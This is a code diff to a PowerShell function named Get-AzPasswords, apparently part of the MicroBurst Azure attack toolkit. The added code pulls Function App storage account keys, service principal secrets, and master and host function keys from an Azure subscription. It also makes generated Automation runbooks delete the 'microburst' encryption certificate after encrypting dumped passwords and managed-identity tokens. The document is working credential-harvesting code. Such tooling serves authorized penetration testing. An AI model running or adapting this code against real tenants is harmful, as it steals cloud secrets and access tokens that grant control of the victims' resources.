@@ -574,6 +574,9 @@ Function Get-AzPasswords
                     # Encrypt the passwords in the Automation account output
                     "`$encryptedOut = (`$base64string | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
 
+                    # Remove the Certificate from the Cert Store
+                    "`Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+
                     # Write the output to the log
                     "write-output `$encryptedOut" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         
@@ -650,6 +653,8 @@ Function Get-AzPasswords
                 "`$accessToken = Invoke-RestMethod -Uri `$url -Method 'GET' -Headers `$Headers" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                 # Encrypt the token in the Automation account output
                 "`$encryptedOut1 = (`$accessToken.access_token | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                # Remove the encryption cert
+                "Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                 "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                 
                
@@ -1018,20 +1023,43 @@ Function Get-AzPasswords
                 
                 $functAppName = $_.Name
 
-                Write-Verbose "`tGetting Function keys from the $functAppName application"
+                Write-Verbose "`tGetting Function keys and App Settings from the $functAppName application"
                 # Extract Storage Account Key
-                $appSettings = ($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING).Split(";")
-                $TempTblCreds.Rows.Add("Function App Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                if($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING -ne $null){
+                    $appSettings = ($_.ApplicationSettings.WEBSITE_CONTENTAZUREFILECONNECTIONSTRING).Split(";")
+                    $TempTblCreds.Rows.Add("Function App Content Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                }
+
+                # Extract Job Storage Keys
+                if($_.ApplicationSettings.AzureWebJobsStorage -ne $null){
+                    $appSettings = ($_.ApplicationSettings.AzureWebJobsStorage).Split(";")
+                    $TempTblCreds.Rows.Add("Function App Job Storage Account",$_.Name,($appSettings[1]).Trim("AccountName="),($appSettings[2]).Trim("AccountKey="),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                }
+
+                # Extract Service Principal
+                if($_.ApplicationSettings.MICROSOFT_PROVIDER_AUTHENTICATION_SECRET -ne $null){
+                    $appSettings = ($_.ApplicationSettings.MICROSOFT_PROVIDER_AUTHENTICATION_SECRET)
+
+                    # Use APIs to grab Client ID
+                    $mgmtToken = (Get-AzAccessToken -ResourceUrl 'https://management.azure.com/').Token
+                    $subID = (get-azcontext).Subscription.Id
+                    $servicePrincipalID = ((Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/resourceGroups/',$_.ResourceGroup,'/providers/Microsoft.Web/sites/',$_.Name,'/Config/authsettingsV2/list?api-version=2018-11-01')) -UseBasicParsing -Headers @{ Authorization ="Bearer $mgmtToken"} -Verbose:$false ).content | ConvertFrom-Json).properties.identityProviders.azureActiveDirectory.registration.clientId
+
+                    $TempTblCreds.Rows.Add("Function App Service Principal",$_.Name,$servicePrincipalID,$appSettings,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
+                }
 
                 # Request the Function Keys
-                $functKeys = $_ | Invoke-AzResourceAction -Action host/default/listkeys -Force
-                $TempTblCreds.Rows.Add("Function App Master Key",$_.Name,"master",$functKeys.masterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                try{
+                    $functKeys = $_ | Invoke-AzResourceAction -Action host/default/listkeys -Force -ErrorAction Stop
+                    $TempTblCreds.Rows.Add("Function App Master Key",$_.Name,"master",$functKeys.masterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                 
-                $keyMembers = ($functKeys.functionKeys | get-member | where MemberType -EQ "NoteProperty")
+                    $keyMembers = ($functKeys.functionKeys | get-member | where MemberType -EQ "NoteProperty")
                 
-                $keyMembers | ForEach-Object{
-                    $TempTblCreds.Rows.Add("Function App Host Key",$functAppName,$_.Name,(($_.Definition) -replace "String ") -replace (-join($_.Name,"=")),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                    $keyMembers | ForEach-Object{
+                        $TempTblCreds.Rows.Add("Function App Host Key",$functAppName,$_.Name,(($_.Definition) -replace "String ") -replace (-join($_.Name,"=")),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                    }
                 }
+                catch{Write-Verbose "`t`tERROR - Getting Function keys from the $functAppName application failed"}
             }
         }
     }
